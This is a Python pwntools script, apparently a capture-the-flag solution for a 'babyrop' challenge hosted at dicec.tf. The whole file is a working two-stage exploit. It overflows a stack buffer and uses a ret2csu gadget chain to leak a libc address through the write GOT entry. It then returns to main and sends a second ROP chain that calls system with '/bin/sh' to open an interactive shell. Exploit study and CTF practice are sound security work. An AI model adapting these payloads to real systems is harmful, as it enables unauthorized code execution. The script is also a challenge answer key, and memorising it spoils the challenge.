from pwn import *

conn_type = 1
debug = 0

if(conn_type):
	target = remote("dicec.tf", 31924)
else:
	target = process("./babyrop")
	
if(debug):
	input("Ready for debug...")


got_gets                = p64(0x0000000000404020)
pop_rdi                 = p64(0x00000000004011d3)
got_plt_write           = p64(0x0000000000404018)
mid_csu                 = p64(0x00000000004011a7)
pop_values_to_r_regs    = p64(0x00000000004011cc) 
data                    = p64(0x0000000000404028)
pop_rbp                 = p64(0x000000000040111d)
main                    = p64(0x0000000000401136)
ret                     = p64(0x000000000040101a)

text = target.recvuntil("Your name: ")
print(text.decode())

# The first payload is overflowing the buffer, poping values to the r registers 
# as they control what csu is passing as parameters and calling to, while setting
# rbp to ziro to make csu init to call one function (which we call the write function to
# leak the libc address) and setting some values as csu init is popping lots of values in 
# the end including the rbp where the value we set will pivot it to the data segement.
# in addition this payload will also call back to main to enter the second payload.

payload = b""
payload += b"A" * 64 + b"B" * 8
payload += pop_rbp + p64(0x1) + pop_values_to_r_regs + p64(0x1) + got_gets + p64(0x8) + got_plt_write
payload += mid_csu
payload += b"C" * 8 + b"D" * 8 + data + 32 * b"A"
payload += main

target.sendline(payload)

addr = u64(target.recv(8)) # collecting the leaked libc address
text = target.recvuntil("Your name: ")

print(hex(addr))
print(text.decode())

# The second payload will overflow the buffer again and change the return address to gadget
# poping to rdi the bin sh string, another gadget of ret to fix alignment of stack and the 
# system function to open a shell.

payload1 = b""
payload1 += b"A" * 64 + b"B" * 8 
payload1 += ret
payload1 += pop_rdi + p64(addr + 0x130aba) + p64(addr - 0x316e0)

target.sendline(payload1)

target.interactive()
